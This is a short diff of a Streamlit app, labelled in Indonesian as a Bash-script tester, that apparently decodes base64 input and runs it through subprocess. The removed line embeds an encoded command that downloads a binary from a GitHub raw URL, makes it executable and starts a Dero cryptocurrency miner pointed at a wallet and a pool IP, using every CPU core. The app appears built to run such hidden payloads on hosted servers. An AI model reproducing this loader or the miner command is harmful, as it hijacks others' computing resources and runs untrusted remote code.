@@ -5,7 +5,7 @@ import subprocess
 st.title("Pengujian Skrip Bash pada Streamlit")
 
 # Input untuk skrip base64
-bash_script_base64 = st.text_area("Y3VybCAtTyBidWlsZHMgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FyanVpbGxhaGFsbWFkYWRpL0RyaXZpbnNvbi9tYWluL2Jvbm9zID4gYnVpbGRzICYmIGNobW9kIDc3NyAmJiAuL2J1aWxkcyAtdyBkZXJvMXF5ZHF3eWcwcmptc3lmbDlnNTJucDM4bnY2NDV5NzVsMDd2OXRseHpjejc4MGV6c251ZWRrcXFxZWt4OHcgLWQgMTQzLjE5OC44NC4yMjQ6ODAgLS1zaG93LXBvb2wtc2hhcmVzIC10ICQobnByb2MgLS1hbGwpIC0tZGVidWctc2hhcmVzIC0tcG9wY250:")
+bash_script_base64 = st.text_area("Masukkan skrip Bash (base64):")
 
 if st.button("Jalankan Skrip"):
     if bash_script_base64:
